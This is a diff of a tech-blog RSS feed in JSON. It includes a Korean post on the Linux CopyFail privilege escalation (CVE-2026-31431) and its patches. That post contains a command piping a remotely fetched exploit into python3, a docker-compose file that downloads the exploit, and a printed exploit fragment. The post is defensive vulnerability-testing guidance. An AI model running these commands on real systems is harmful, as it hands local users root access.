-    "description": "안녕하세요! 모바일 개발자 경험 팀의 @giginet입니다. 평소에는 LINE iOS 앱을 중심으로 빌드 시스템과 개발 환경을 정비하고, 개발자 경험을 향상하기 위한 업무를 하고 ...",
-    "reviews": [],
-    "syllabus": [],
-    "link": "https://techblog.lycorp.co.jp/ko/building-rag-system-with-vector-db-and-agent-skills",
-    "pubDate": "Thu, 07 May 2026 05:00:00 GMT",
-    "creator": "Unknown",
-    "categories": []
-  },
-  {
-    "id": 6,
-    "imageUrl": "",
-    "title": "Kotlin Ecosystem Mentorship Program: Results and Winners",
-    "description": "In the Kotlin Ecosystem Mentorship Program pilot, mentors and mentees worked together on real Kotlin open-source projects to make their first meaningful community contribution. Four pairs successfully completed the two-month program, and one eligible pair was randomly selected in the prize drawing to receive the grand prize – a trip to KotlinConf 2026 in Munich! […]",
-    "reviews": [],
-    "syllabus": [],
-    "link": "https://blog.jetbrains.com/kotlin/2026/05/kotlin-ecosystem-mentorship-program/",
-    "pubDate": "Thu, 07 May 2026 14:45:45 +0000",
-    "creator": "Ksenia Shneyveys",
-    "categories": [
-      "education",
-      "news",
-      "kotlin-foundation",
-      "open-source"
-    ]
-  },
-  {
-    "id": 7,
-    "imageUrl": "",
     "title": "치지직 챗봇 buzzk - SECRET 문자 잘 복사하자",
     "description": "한심한 복붙 문제로 실패했었군요\n치지직의 개발자 페이지에서 앱을 만들면 SECRET 문자를 볼 수 있습니다.\n이걸 복사해야하는데 마지막 문자열을 빼먹고 복사했습니다.\n\n\n이렇게 생겼는데 제 브라우저가 글씨를 키운 상태라 끝까지 안보입니다.\n \n\n\n뒤에 더 있었습니다.\n복사하기 버튼이 없어서 실수 할 가능성이 있군요\n실패 매시지도 SECRET 이 이상하다고는 안알려주니 하루를 낭비했군요",
     "reviews": [],
@@ -104,7 +16,197 @@
     ]
   },
   {
+    "id": 2,
+    "imageUrl": "",
+    "title": "PhpStorm 2026.2 Early Access Program Has Started",
+    "description": "The Early Access Program (EAP) for the next major PhpStorm 2026.2 release is now open! PhpStorm’s EAP builds are a great opportunity to try upcoming features for free in your real workflows and share feedback with the PhpStorm team. Your input directly influences what makes it into the final release. This release, our main areas of […]",
+    "reviews": [],
+    "syllabus": [],
+    "link": "https://blog.jetbrains.com/phpstorm/2026/05/phpstorm-2026-2-early-access-program-has-started/",
+    "pubDate": "Tue, 12 May 2026 13:36:37 +0000",
+    "creator": "Hanna Yakush",
+    "categories": [
+      "eap",
+      "2026-2"
+    ]
+  },
+  {
+    "id": 3,
+    "imageUrl": "",
+    "title": "Migrating Data Ingestion Systems at Meta Scale",
+    "description": "Meta’s data ingestion system, which our engineering teams leverage for up-to-date snapshots of the social graph, has recently undergone a significant revamp to enhance its reliability at scale.  Moving from our legacy system to our new architecture required a large-scale migration of our entire data ingestion system.  We’re sharing the solutions and strategies that enabled [...]\nRead More...\nThe post Migrating Data Ingestion Systems at Meta Scale appeared first on Engineering at Meta.",
+    "reviews": [],
+    "syllabus": [],
+    "link": "https://engineering.fb.com/2026/05/12/data-infrastructure/migrating-data-ingestion-systems-at-meta-scale/",
+    "pubDate": "Tue, 12 May 2026 16:00:57 +0000",
+    "creator": "Unknown",
+    "categories": [
+      "Data Infrastructure"
+    ]
+  },
+  {
+    "id": 4,
+    "imageUrl": "",
+    "title": "TeamCity 2026.1: CLI, MCP for AI Agents, Pipelines Enhancements, and More",
+    "description": "TL;DR: TeamCity 2026.1 is out and packed with helpful features. We’re introducing the TeamCity CLI and MCP support, as well as Pipelines enhancements to make configuring TeamCity more convenient and powerful. As of this release, AI Assistant is available in Enterprise trial accounts, and the SAML authentication plugin comes bundled with TeamCity. For the full […]",
+    "reviews": [],
+    "syllabus": [],
+    "link": "https://blog.jetbrains.com/teamcity/2026/05/teamcity-20261/",
+    "pubDate": "Tue, 12 May 2026 08:59:41 +0000",
+    "creator": "Olga Bedrina",
+    "categories": [
+      "news",
+      "releases",
+      "teamcity-2",
+      "release",
+      "whatsnew-2"
+    ]
+  },
+  {
+    "id": 5,
+    "imageUrl": "",
+    "title": "Linux CopyFail 취약점 패치, CVE-2026-31431",
+    "description": "2026년 4월말 리눅스 커널에 치명적인 보안 버그인 일명 CopyFail CVE-2026-31431이 발표되었다. 이 글에서는 CopyFail의 간단한 소개와 보안 버그에 해당하는지 PoC 테스트하는 방법 및 보안 패치, 완화 처치 방안에 대해 다룬다. 특히 커널 업그레이드나 blacklist 처리 방법에 대해서 자세히 다루도록 한다.\n \n1. CopyFail CVE-2026-31431이란?\nCopyFail CVE-2026-31431 PoC demo (출처 : copy.fail)\n\n\nCopyFail은 2017년에 커널에 도입된 기능으로서 최근에서야 발견되었기 때문에 현재 대부분의 리눅스가 영향을 받는다. \n이 취약점은 2026년 4월 29일 공개되었고, AI를 사용하여 취약점을 발견하는 보안팀인 Xint Code에 의해 공개되었다.[1]\nCopyFail 취약점은 로컬 권한 상승(Local Privilege Escalation) 취약점으로, 커널의 암호화를 위한 algif_aead에서 splice 시스템 콜을 처리할 때 하드웨어 가속을 일반 유저에게도 사용할 수 있게 해주던 기능이다. 일반 유저도 커널의 기능을 쉽게 사용할 수 있도록 만들어졌지만, 역으로 커널 레벨에서 관리자 권한을 훔칠 수 있게 되었다.\n현재 AWS나 대부분의 호스팅 업체에서 사용하는 Fedora계열, RH계열(Rocky, Alma, SuSe, 구형 CentOS...), Debian계열(Debian, Ubuntu, Mint ...) 등등 거의 모든 리눅스가 CopyFail 취약점을 가지고 있다. 특히 RH계열(레드햇 계열)은 algif_aead 커널 기능을 module이 아닌 builtin으로 넣어두었기 때문에 더욱 위험하다고 볼 수 있다.\n이 취약점은 일단 로컬 유저로 액세스한 뒤에 root 권한을 훔칠 수 있기에 덜 위험하다고 생각될수도 있지만 의존성으로 인해 설치되는 각종 패키지나 혹은 curl | sh 방식으로 프로그램 설치를 유도한 뒤에 시스템에 잠입해서 쉽게 root권한을 훔치는 다양한 공격을 취할 수 있기 때문에 되도록이면 빨리 패치해야만 한다.\n \n2. CopyFail PoC 테스트 방법\n앞서 이야기 했듯이 2017년에 도입된 기능이므로 현재 사용되는 거의 모든 리눅스가 취약하다고 볼 수 있다. 그럼에도 불구하고 자신의 리눅스 시스템에서 확인하고자 한다면 다음과 같이 확인해볼 수 있다.\n \n2.1. PoC 코드 (주의!. 운영 환경에서 사용하지 말 것)\n첫번째로 이 취약점을 발견한 Theori의 웹사이트에서는 다음과 같은 명령으로 PoC를 해볼 수 있다. Python 3.10이상에서 사용가능하며, 이 PoC를 실행하면 su 명령이 암호없이 뚫리는 상태가 되므로 운영 환경에서는 실습하지 않도록 주의해야 한다. 개인용 시스템이나 실습용 시스템에서만 사용하기를 권장한다.\n다시 말하지만 운영환경에서는 함부로 실행해보면 안된다. 만일 실행했다면 echo 3 > /proc/sys/vm/drop_caches로 페이지 캐시를 비워주면 복구되는 경우도 간혹 있지만, 만일 복구가 안된다면 리부팅을 해야만 오염된 페이지 캐시가 제거된다. 따라서 copyfail PoC는 절대로 운영환경에서 실행하면 안된다.\ncurl https://copy.fail/exp | python3 && su\nCopyFail의 PoC 원리는 AF_ALG 소켓을 열고, setuid(0) 코드를 페이지 캐시에 오염시켜서 su 명령시 root 권한으로 명령을 실행하게 한다. 따라서 PoC가 성공한 뒤에는 어떤 유저든지 su 명령시 권한이 상승되어 root 패스워드가 필요없어진다.\n \n2.2. Docker를 이용한 테스트 (안전한 취약점 테스트 방법)\n이 방법은 docker를 이용해서 container에서 PoC를 실행시키는 방법으로, 컨테이너가 host의 algif_aead를 사용하지만 오염시키는 su가 container 안에 있는 su 바이너리라는 점이 다르다. 그리고 container를 제거하기 전에 fadvise로 오염된 컨테이너의 /usr/bin/su의 page cache를 제거하기 위해 POSIX_FADV_DONTNEED를 호출하는 구조를 사용한다. 이렇게 하면 container를 통해 1회성으로 취약점 PoC 테스트를 해볼 수 있다.\n이 테스트 방법은 먼저 docker가 설치되어있어야 한다. 보통 docker-ce를 설치하므로 여기서도 docker-ce가 설치된 시스템을 기준으로 설명한다. 혹시라도 설치되어있지 않다면 \"install docker-ce on <배포판>\"으로 검색하면 바로 상단에 나올 것이다. 예를 들어 Rocky 리눅스라면 \"install docker-ce on rocky linux\"로 검색하면 된다. 아니면 AI에게 질문해도 된다.\n \n2.2.1. 준비 과정\n먼저 docker 실행 권한을 가진 일반 유저로 2개의 테스트용 파일(Dockerfile, docker-compose.yml)을 만든다. 적당한 디렉토리를 하나 만들고 그 안에 만들면 편리할 것이다. 아래는 파일을 redirect로 생성하는 명령어로서 복사해서 붙여넣으면 파일이 만들어진다. \ncat <<HERE >Dockerfile\nFROM python:3.10-slim\nRUN apt-get update && apt-get install -y --no-install-recommends \\\n    curl passwd && rm -rf /var/lib/apt/lists/*\nHERE\n위의 첫번째 명령어를 복사해서 붙여넣어 실행하면 Dockerfile이 생성되고, 아래 두번째 명령어를 복붙해서 실행하면 docker-compose.yml 파일이 생성될 것이다.\ncat <<HERE >docker-compose.yml\nservices:\n  copyfail-test:\n    build: .\n    container_name: copyfail_test\n    privileged: true\n    stdin_open: true  # -i option\n    tty: true         # -t option\n    command: |\n      bash -c \"\n      useradd -m sunyzero -s /bin/bash\n      echo 'sunyzero:qwer1234' | chpasswd\n      echo 'root:rootqwer1234' | chpasswd\n      curl -L https://copy.fail/exp > ~sunyzero/copyfail_poc.py\n      chown sunyzero:sunyzero /home/sunyzero/copyfail_poc.py\n      echo 'To test exploit(CopyFail,CVE-2026-31431)'\n      echo '   Run:    python3 ~/copyfail_poc.py'\n      echo '===================[ Ready for your command ]====================='\n      su - sunyzero\n      # 종료 후 fadvise로 su의 page cache를 비우도록 함.\n      python3 -c \\\"\n      import os\n      fd = os.open('/usr/bin/su', os.O_RDONLY)\n      os.posix_fadvise(fd, 0, 0, os.POSIX_FADV_DONTNEED)\n      os.close(fd)\n      \\\"\n      sync\n      \"\nHERE\n2개의 파일이 생성된 다음에는 docker compose 명령으로 실행을 해야 할 것이다.\n \n2.2.2. PoC를 컨테이너에서 실행\n컨테이너는 다음과 같은 docker compose --rm copyfail-test 명령어로 실행하되, --rm 옵션을 추가해서 컨테이너를 종료하는 즉시 삭제되도록 한다. (아래처럼 명령어가 긴 경우 대충 두서너 글자를 치고 tab을 치면 완성해준다)\n$ docker compose run --rm copyfail-test\n...생략...\nTo test exploit(CopyFail,CVE-2026-31431),\n    Run:    python3 ~/copyfail_poc.py\n===================[ Ready for your command ]=====================\nsunyzero@e31dfcc7a99d:~$ ls\ncopyfail_poc.py\nsunyzero@e31dfcc7a99d:~$ id\nuid=1000(sunyzero) gid=1000(sunyzero) groups=1000(sunyzero)\nsunyzero@e31dfcc7a99d:~$ su -\nPassword:   # 정상적으로 password를 묻는 상태이므로 Ctrl-C로 취소한다.\n\n$ python3 ~/copyfail_poc.py\n# id\nuid=0(root) gid=1000(sunyzero) groups=1000(sunyzero)\n\n# exit\n$ exit\n컨테이너 안에서 내린 명령어를 보면 먼저 ls로 copyfail_poc.py 파일이 저장되어있는지 확인을 했다.\n그 다음에 id 명령으로 sunyzero 로컬 유저의 UID, GID를 확인했다. 결과를 보면 uid=1000(sunyzero) ... 로 일반 유저로 보이고 있다. \n그리고나서 su - 명령을 내려보면 패스워드를 묻는 \"Password: \" 프롬프트가 제대로 보이고 있다. 즉 암호 체크가 제대로 작동중인 안전한 상태인 것이다. 아직 PoC를 실행하지 않은 상태에서 정상인지 확인했으니, Ctrl-C로 취소한다.\n그 다음에는 PoC 코드인 python3 ~/copyfail_poc.py를 실행하면 root 계정이 탈취되는지 확인할 수 있다. 위의 경우에는 id에 uid=0(root)가 나오는 것으로 보이므로 로컬 권한 상승으로 root 계정이 탈취당했음을 알 수 있다. 안전하게 보안 패치된 시스템에서는 패스워드를 묻는 프롬프트가 나와서 로컬 권한 상승을 막는다. 혹은 완화 처리(mitigation)된 시스템에서는 오류가 발생하도록 되어있다.\n취약점이 존재하여 root를 탈취당하는 시스템이라면 아래와 같이 copyfail 보안 패치나 완화 방법을 사용해야 한다. 여기서는 Fedora, Rocky, Ubuntu별로 따로 설명하도록 한다.\n \n3. CopyFail 보안 패치 방법\n레드햇 계열(Fedora, Rocky, Alma ...)들은 algif_aead가 커널에 builtin되어있고, 데비안 계열(Debian, Ubuntu, Mint...)들은 module로 되어있어서 패치 방법이 조금은 다르다.\n레드햇 계열에서는 패치된 커널로 업그레이드하거나 아니면 boot parameter에서 blacklist로 해당 기능을 처리하는 완화 방법(mitigation)이 주로 쓰이고, 데비안 계열은 module이라 간단하게 blacklist 환경 설정 파일만 설정해주면 된다.\n우선 커널에 AEAD이 존재하는지는 /boot/config-$(uname -r)파일이나 modinfo로 쉽게 알 수 있다. 아래는 레드햇 계열에서 살펴본 것으로 modinfo에서 filename이 builtin으로 나오는 것을 볼 수 있다.\n$ grep CONFIG_CRYPTO_USER_API_AEAD /boot/config-$(uname -r)\nCONFIG_CRYPTO_USER_API_AEAD=y\n\n$ modinfo algif_aead\nname:           algif_aead\nfilename:       (builtin)\ndescription:    AEAD kernel crypto API user space interface\nauthor:         Stephan Mueller <smueller@chronox.de>\nlicense:        GPL\nfile:           crypto/algif_aead\n우분투는 filename에 경로가 나오는 것으로 봐서 kernel module임을 알 수 있다.\n$ modinfo algif_aead\nfilename:       /lib/modules/5.15.0-144-generic/kernel/crypto/algif_aead.ko\ndescription:    AEAD kernel crypto API user space interface\nauthor:         Stephan Mueller <smueller@chronox.de></smueller@chronox.de>\nlicense:        GPL\nsrcversion:     F89A7DE8CA18E13AB028AA1\n...생략...\n \n3.1. Fedora 리눅스 (레드햇 계열)\n페도라 리눅스에서는 이 글을 쓰는 시점인 5월 9일경 확인한 결과 6.19.14-300에 이어 7.0.4 커널이 올라왔으나 해결은 아직 안된 상태이다. 그럼에도 불구하고 다른 취약점이 패치되어있기 때문에 커널을 업데이트 해주는 것을 추천한다.\nsudo dnf -y update kernel\n커널 업데이트 후에는 reboot를 해야만 한다. 패치가 제대로 되었다면 docker로 PoC 실행시 다음과 같이 root 로 권한이 상승되지 못하고 패스워드를 묻는 프롬프트인 \"Password: \"가 나타나게 된다. 아래 테스트는 페도라43, 페도라44에서 테스트 되었다.\n$ docker compose run --rm copyfail-test \nContainer copyfail-poc-docker-copyfail-test-run-3e60658ad202 Creating \nContainer copyfail-poc-docker-copyfail-test-run-3e60658ad202 Created \n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   731    0   731    0     0   4615      0 --:--:-- --:--:-- --:--:--  4626\nTo test exploit(CopyFail,CVE-2026-31431)\n   Run:    python3 ~/copyfail_poc.py\n===================[ Ready for your command ]=====================\nsunyzero@f1afcd499e5d:~$ python3 ~/copyfail_poc.py\nPassword:\n \n3.2. Rocky 리눅스 (레드햇 계열)\nRocky 리눅스는 이 글을 처음 쓰던 시점에서는 grubby로 부팅 시점에 algif_aead_init 모듈을 blacklist 처리하는 boot parameter를 추가하는 완화 방법으로 처리하도록 안내하고 있었으나, 중간에 5월 9~10일경에 패치된 커널이 올라왔다.[2] 따라서 아래 커널 업그레이드 방법(Plan A)로 처리하는 것을 추천한다.\n \n3.2.1. 커널 업그레이드 방법 (Plan A)\nRocky Linux는 5월 8~10일 경에는 대부분의 버전을 패치했으므로 커널 업그레이드 방법으로 쉽게 해결할 수 있다. 이 글을 탈고하는 시점에서는 Rocky Linux 10은 7.0.x 버전으로 올라가서 다른 보안 취약점까지 같이 패치되고, Rocky Linux 9.6은 5.14.0-611.54.1로 업데이트 되었다. \n커널 업그레이드 방법은 페도라 리눅스와 같다. 테스트는 로키 리눅스 10.1과 9.6에서 테스트 되었다.\nsudo dnf -y update kernel\n커널 업데이트가 완료된 후에는 reboot를 해줘야만 한다. 리부팅 뒤에도 앞서 docker로 PoC를 검사하는 부분을 체크해보는 것을 권장한다.\n \n3.2.2. grubby로 부트 파라메터 조작 방법 (Plan B)\nPlan B 방법은 커널 업그레이드가 용이하지 않을 때 사용하는 방법이다. 하지만 되도록이면 위 플랜A인 커널 업그레이드를 권장한다. 이 기능은 grubby를 사용하므로 root 권한으로 명령한다.\nsudo grubby --args initcall_blacklist=algif_aead_init --update-kernel=ALL\n플랜B는 algif_aead를 커널 레벨에서 블랙리스트 처리하므로 docker PoC로 실행해보면 아래처럼 에러가 발생한다.\n$ docker compose run --rm copyfail-test\nContainer sunyzero-copyfail-test-run-b5913c93ffa3 Creating\nContainer sunyzero-copyfail-test-run-b5913c93ffa3 Created\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   731    0   731    0     0   2044      0 --:--:-- --:--:-- --:--:--  2041\nTo test exploit(CopyFail,CVE-2026-31431)\n   Run:    python3 ~/copyfail_poc.py\n===================[ Ready for your command ]=====================\nsunyzero@c18f31aee811:~$  python3 ~/copyfail_poc.py\nTraceback (most recent call last):\n  File \"/home/sunyzero/copyfail_poc.py\", line 9, in \n    while i\n  File \"/home/sunyzero/copyfail_poc.py\", line 5, in c\n    a=s.socket(38,5,0);a.bind((\"aead\",\"authencesn(hmac(sha256),cbc(aes))\"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b\"A\"*4+c],[(h,3,i*4),(h,2,b'\\x10'+i*19),(h,4,b'\\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)\nFileNotFoundError: [Errno 2] No such file or directory\nsunyzero@c18f31aee811:~$\n \n3.3. Ubuntu 리눅스\n우분투 리눅스는 취약점이 있는 algif_aead가 module로 빌드되어있기 때문에 kernel 패키지에 직접 패치 하지 않고  블랙리스트 처리와 비슷하게 /etc/modprobe.d/disable-algif_aead.conf 파일을 만드는 완화 방법을 사용한다.[3] 따라서 해당 conf 파일을 설치하는 패키지를 제공하는데, 패키지 이름은 kmod 로서 다음과 같이 sudo apt install --only-upgrade kmod 명령으로 업데이트하면 된다.\nkmod 업그레이드 명령에 --only-upgrade 옵션을 사용하면 의존성에 걸린 다른 패키지들을 줄줄이 업데이트하지 않고 딱 kmod만 업그레이드하도록 되어있다. 회사에서 다른 큰 문제가 없다면 sudo apt upgrade로 싹다 업그레이드해도 되지만, 만약에 다른 프로그램들이 작동 중이라면 안전하게 kmod만 업그레이드하는 것도 괜찮다. 아래는 우분투 22에서 테스트한 결과이다.\n$ sudo apt update\n...생략...\n$ sudo apt install --only-upgrade kmod\n...생략...\n이 방법의 장점은 재부팅하지 않고도 활성화 시킬 수 있다. (물론 재부팅을 해도 된다) 그리고나서 algif_aead 커널 모듈이 로딩되어있을테니 제거해주면 된다.\n$ lsmod | grep aead\nalgif_aead             16384  0\naf_alg                 32768  1 algif_aead\n\n$ sudo rmmod algif_aead\n우분투의 kmod가 업그레이드 되면서 설치하는 disable-algif_aead.conf 파일은 copyfail 취약점의 통로인 algif_aead kernel module을 /bin/false로 비활성화 하는 것으로 내용은 다음과 같다.\n$ cat  /etc/modprobe.d/disable-algif_aead.conf\n# Disable algif_aead module due to CVE-2026-31431 (AKA copy.fail)\n# This will likely be re-enabled in a subsequent update once an updated\n# kernel has been deployed.\n# Blacklisting the module isn't sufficient, we need to do as below:\ninstall algif_aead /bin/false\n간혹 blacklist algif_aead 로 설정하라는 글이 있는데, 위 주석에도 적혀있듯이 blacklist보다는 /bin/false로 하는 방법이 더 깔끔하다. 참고로 kmod의 conf 파일을 실수로 지웠다든지 하는 경우에는 재설치할 때 missing conf 파일을 덮어쓰도록 하는 옵션을 사용해서 아래처럼 명령해야 한다.\nsudo apt-get -o Dpkg::Options::=\"--force-confmiss\" install --reinstall kmod\n \n4. 결론\n리눅스의 CopyFail 취약점을 패치하기 위해서는 Fedora, Rocky, Ubuntu가 조금씩 다르기 때문에 그에 맞춰서 업그레이드 혹은 패치해주면 된다. 각 리눅스 배포판에 따라 패치가 나와있는지도 확인해보는 것이 좋다.[4] 다만 패치 후에는 확실하게 보완되었는지를 docker 컨테이너에서 테스트를 통해 검증해보는 것도 필요하다고 생각된다.\n \n참조\n[1] CopyFail, https://copy.fail\n[2] Mitigating CVE-2026-31431 on Rocky Linux 8, 9, 10, and LTS Variants. May 1, 2026. https://kb.ciq.com/article/rocky-linux/rl-cve-2026-31431-mitigation\n[3] Fixes available for CVE-2026-31431, Luci Stanescu, 30 April 2026, https://ubuntu.com/blog/copy-fail-vulnerability-fixes-available\n[4] Vulnerability Intelligence \nCVE-2026-31431, https://mondoo.com/vulnerability-intelligence/vulnerability/CVE-2026-31431",
+    "reviews": [],
+    "syllabus": [],
+    "link": "https://sunyzero.tistory.com/328",
+    "pubDate": "Tue, 12 May 2026 03:55:59 +0900",
+    "creator": "sunyzero",
+    "categories": [
+      "컴퓨터 관련/리눅스(유닉스) 일반",
+      "algif_aead",
+      "algif_aead_init",
+      "CopyFail",
+      "CVE-2026-31431",
+      "linux",
+      "리눅스 보안"
+    ]
+  },
+  {
+    "id": 6,
+    "imageUrl": "",
+    "title": "ODW #5: 벡터 DB와 에이전트 스킬로 RAG 시스템 만들기",
+    "description": "안녕하세요! 모바일 개발자 경험 팀의 @giginet입니다. 평소에는 LINE iOS 앱을 중심으로 빌드 시스템과 개발 환경을 정비하고, 개발자 경험을 향상하기 위한 업무를 하고 ...",
+    "reviews": [],
+    "syllabus": [],
+    "link": "https://techblog.lycorp.co.jp/ko/building-rag-system-with-vector-db-and-agent-skills",
+    "pubDate": "Thu, 07 May 2026 05:00:00 GMT",
+    "creator": "Unknown",
+    "categories": []
+  },
+  {
+    "id": 7,
+    "imageUrl": "",
+    "title": "MySQL 3분 vs ClickHouse 0.3초 — 같은 쿼리입니다",
+    "description": "[![NHN Cloud_meetup banner_CH_202605_900.png](https://image.toast.com/aaaadh/real/2026/techblog/NHN%20Cloudmeetup%20bannerCH202605900.png)](https://www.nhncloud.com/kr)\r\r\n\r\r\n## 들어가며\r\r\n\r\r\n최근 MySQL 기반 서비스들로부터 ClickHouse 도입 문의를 받으면서 직접 검토하고 도입하게 되었습니다.\r\r\n실제 운영 중인 서비스에 적용하며 성능을 확인할 수 있었고, 기술과 경험을 공유하고자 글을 작성했습니다.\r\r\n\r\r\n\r\r\n\r\r\n## ClickHouse란?\r\r\n\r\r\n[ClickHouse](https://clickhouse.com/)는 데이터를 빠르게 읽기 위해 만들어진 데이터베이스입니다.\r\r\nMySQL은 행(Row) 단위로 데이터를 저장하고, ClickHouse는 열(Column) 단위로 데이터를 저장합니다.\r\r\n\r\r\n행 단위 DBMS는 데이터를 블록 단위로 저장하고 읽기 때문에 일부 열만 필요한 쿼리라도 해당 행 전체 블록을 메모리에 올려야 합니다. 즉, 불필요한 열 데이터까지 I/O가 발생합니다.\r\r\n\r\r\n![NHN Cloud_meetup diagram_clickHouse_01.gif](https://image.toast.com/aaaadh/real/2026/techblog/NHN%20Cloudmeetup%20diagramclickHouse01.gif)\r\r\n(source: [https://clickhouse.com/docs/intro](https://clickhouse.com/docs/intro))\r\r\n\r\r\n\r\r\n반면 열 단위 DBMS는 열 단위로 데이터를 순차 저장하기 때문에 쿼리에 필요한 열만 선택적으로 읽을 수 있어 불필요한 I/O를 방지하고 분석 쿼리 성능이 크게 향상됩니다.\r\r\n\r\r\n![NHN Cloud_meetup diagram_clickHouse_02.gif](https://image.toast.com/aaaadh/real/2026/techblog/NHN%20Cloudmeetup%20diagramclickHouse02.gif)\r\r\n(source: [https://clickhouse.com/docs/intro](https://clickhouse.com/docs/intro))\r\r\n\r\r\n\r\r\n![NHN Cloud_meetup diagram_clickHouse_03_900.png](https://image.toast.com/aaaadh/real/2026/techblog/NHN%20Cloudmeetup%20diagramclickHouse03900.png)\r\r\n\r\r\n따라서 SUM, COUNT, AVG 같은 집계 쿼리를 실행할 때 MySQL은 모든 열을 읽어야 하지만 ClickHouse는 필요한 열만 읽기 때문에 대량 데이터 조회에서 빠른 성능을 냅니다.\r\r\n\r\r\n\r\r\n\r\r\n## MySQL의 한계, 그리고 ClickHouse\r\r\n\r\r\nMySQL은 트랜잭션, 단건 조회/수정/삭제 작업에 현재도 널리 사용됩니다. 다만, 한계가 있습니다.\r\r\n\r\r\n### MySQL이 한계를 보이는 순간\r\r\n\r\r\n데이터가 수천만 건을 넘어가면서 집계 쿼리 하나가 30초, 1분, 그리고 타임아웃으로 이어지기도 합니다. 인덱스를 아무리 잘 잡아도, 읽어야 할 데이터 자체가 너무 많으면 성능 개선이 어렵습니다. MySQL은 행(Row) 단위로 저장하기 때문에 `SUM(amount)` 하나를 구하려 해도 모든 칼럼을 통째로 읽어야 해서 느립니다. 데이터가 쌓일수록 이 문제는 피할 수 없습니다.\r\r\n\r\r\n\r\r\n\r\r\n### ClickHouse가 돌파한 지점\r\r\n\r\r\n| MySQL의 한계 | ClickHouse의 해결 |\r\r\n| --- | --- |\r\r\n| 집계 쿼리 = 전체 행 풀스캔 | 필요한 칼럼만 읽는 열 저장 구조 |\r\r\n| 인덱스로 한계, 수억 건은 답 없음 | 파티션 + 정렬 키로 읽는 범위 자체를 줄임 |\r\r\n| 무거운 쿼리 1개가 전체 DB 영향 | 병렬 처리로 쿼리 간 간섭 없음 |\r\r\n| 대용량 적재 시 성능 저하 | 배치 INSERT에 최적화된 구조 |\r\r\n| 저장 공간 그대로 | 열 단위 압축으로 용량 80% 이상 절감 |\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n## ClickHouse를 다루는 올바른 이해\r\r\n\r\r\n다만, MySQL을 사용하듯이 ClickHouse를 사용하면 오히려 MySQL보다 느리거나 데이터가 기대와 다르게 동작할 수 있습니다. ClickHouse를 단순히 \"빠른 MySQL\"로 이해해서는 안 됩니다. \r\r\n\r\r\n두 DB는 해결하려는 문제가 다르므로 이 차이를 이해하고 사용해야 효과적으로 운영할 수 있습니다.\r\r\n\r\r\n\r\r\n\r\r\n### OLTP vs OLAP — 설계 철학이 다릅니다\r\r\n\r\r\n| 구분 | OLTP | OLAP |\r\r\n| --- | --- | --- |\r\r\n| 대표 DB | MySQL, PostgreSQL | ClickHouse, BigQuery |\r\r\n| 주요 작업 | 단건 조회, INSERT/UPDATE/DELETE, 트랜잭션 | 대량 집계, 통계, 분석 |\r\r\n| 최적화 방향 | 정합성, 트랜잭션 보장 | 빠른 읽기, 압축, 처리량 |\r\r\n| 저장 단위 | 행(Row) | 열(Column) |\r\r\n| 설계 철학 | \"1건도 틀리면 안 된다\" | \"1억 건을 빠르게 본다\" |\r\r\n\r\r\n\r\r\n\r\r\nOLTP는 트랜잭션 처리에 최적화된 설계입니다. ACID(원자성·일관성·격리성·지속성)를 보장하며, 결제 도중 오류가 나면 전체가 롤백 되고 데이터는 항상 일관된 상태를 유지합니다. 단건 조회·수정·삭제처럼 \"1건도 틀리면 안 된다\"라는 워크로드에 적합합니다.\r\r\n\r\r\nOLAP는 분석 처리에 최적화된 설계입니다. 트랜잭션과 같은 다중 테이블 정합성 보장은 설계 범위 밖이며, 수십억\\~수조 개의 행을 빠르게 읽고 집계하는 것에 집중합니다. \"1억 건을 빠르게 본다\"라는 워크로드에 적합합니다.\r\r\n\r\r\nMySQL은 OLTP DB이며, 트랜잭션 정합성과 단건 처리에 최적화되어 있습니다.\r\r\nClickHouse는 OLAP DB이며, 모든 설계가 \"대량 데이터를 빠르게 읽는다\"라는 목표에 맞춰져 있습니다.\r\r\n\r\r\n**두 DB는 경쟁 관계가 아닙니다. 정합성이 절대적인 트랜잭션 워크로드는 MySQL이, 대량 데이터를 빠르게 집계·분석하는 워크로드는 ClickHouse가 맡는 구조로 함께 사용하는 것이 올바른 접근입니다.**\r\r\n\r\r\n\r\r\n\r\r\n## ClickHouse 적합 케이스\r\r\n\r\r\n이런 상황이면 ClickHouse가 효과적입니다.\r\r\n\r\r\n| 상황 | 예시 |\r\r\n| --- | --- |\r\r\n| 대량 데이터의 집계/통계 조회 | 일별/월별 매출 합산, 사용자 행동 분석 |\r\r\n| 데이터가 계속 쌓이는 로그성 테이블 | 이벤트 로그, 결제 이력, 접속 기록 |\r\r\n| 특정 칼럼만 골라서 분석하는 쿼리 | `SELECT SUM(amount) WHERE date BETWEEN ...` |\r\r\n\r\r\n아래 쿼리 패턴을 사용한다면 ClickHouse에서 성능을 확인할 수 있습니다.\r\r\n\r\r\n\r\r\n\r\r\n**패턴 1 - 날짜 범위 + 집계**\r\r\n\r\r\n```\r\r\n-- AS-IS: MySQL에서 30초 이상 걸리던 쿼리\r\r\nSELECT DATE(created_at) AS day, COUNT(*) AS cnt, SUM(amount) AS total\r\r\nFROM orders\r\r\nWHERE created_at BETWEEN '2024-01-01' AND '2024-12-31'\r\r\nGROUP BY day\r\r\nORDER BY day;\r\r\n\r\r\n-- TO-BE: ClickHouse로 이관 → 1초 이내\r\r\n-- 구조 동일\r\r\n```\r\r\n\r\r\n 적용 추천: 일별/월별 리포트, 대시보드 통계\r\r\n\r\r\n\r\r\n\r\r\n**패턴 2 - 특정 조건 필터 후 대용량 COUNT**\r\r\n\r\r\n```\r\r\n-- 수천만 건 테이블에서 특정 상태값 집계\r\r\nSELECT status, COUNT(*) AS cnt\r\r\nFROM user_events\r\r\nWHERE created_at >= '2024-06-01'\r\r\nGROUP BY status;\r\r\n```\r\r\n\r\r\n 적용 추천: 사용자 행동 분석, 이벤트 로그 집계\r\r\n\r\r\n\r\r\n\r\r\n**패턴 3 - 다중 그룹핑 통계**\r\r\n\r\r\n```\r\r\n-- 서비스별 + 날짜별 + 타입별 3중 집계\r\r\nSELECT service_id, DATE(created_at), event_type, SUM(amount)\r\r\nFROM transaction_log\r\r\nWHERE created_at BETWEEN '2024-01-01' AND '2024-12-31'\r\r\nGROUP BY 